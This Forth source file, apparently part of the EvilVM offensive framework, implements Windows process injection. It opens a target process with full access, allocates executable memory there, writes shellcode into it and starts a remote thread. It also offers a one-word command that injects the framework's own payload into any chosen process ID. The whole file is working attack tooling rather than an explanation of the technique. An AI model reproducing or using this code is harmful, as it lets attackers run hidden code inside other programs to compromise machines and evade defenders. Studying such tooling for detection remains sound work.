
{ ." 

inject.fth

Implements basic CreateRemoteThread() injection.  Given a region in
memory addr len with your shellcode, inject into another process
using the following syntax:

    addr len pid inject

For convenience, you can inject the current EvilVM payload with:

    pid inject-evilvm

Use the ps and psfind [string] commands to find target PIDs.
    
\x03" }!

private

$1fffff value PROCESS_ALL_ACCESS

kernel32 1 dllfun CloseHandle CloseHandle
kernel32 3 dllfun OpenProcess OpenProcess
kernel32 5 dllfun VirtualAllocEx VirtualAllocEx
kernel32 5 dllfun WriteProcessMemory WriteProcessMemory
kernel32 7 dllfun CreateRemoteThread CreateRemoteThread

variable proc
variable addr
variable thread
variable stage

: ?0err    dup 0= if .err then ;
: ?close   @ dup if CloseHandle else drop then ;

: .stage   
  stage @ dup ." Stage [" 0 .r ." ] " case
    0 of ." Opening process handle\n" endof
    1 of ." Allocating memory\n"      endof
    2 of ." Writing shellcode\n"      endof
    3 of ." Creating remote thread\n" endof
    drop ." Off the map!\n"
  endcase
  1 stage +!
;

: inject ( addr u pid -- )
  .stage PROCESS_ALL_ACCESS 0 rot OpenProcess dup proc ! if
    .stage dup 2 * proc @ 0 rot $3000 $40 VirtualAllocEx ?0err addr !
    .stage 2>r proc @ addr @ 2r> here WriteProcessMemory ?0err drop
    .stage proc @ 0 0 addr @ 0 0 here CreateRemoteThread ?0err CloseHandle drop
  else
    .err
  then
;

public{

: inject 
  proc off 
  thread off
  stage off
  .pre inject .post 
  proc ?close
  thread ?close
;

: inject-evilvm ( pid -- )
  entrypoint endofshell over - rot inject
;

}public
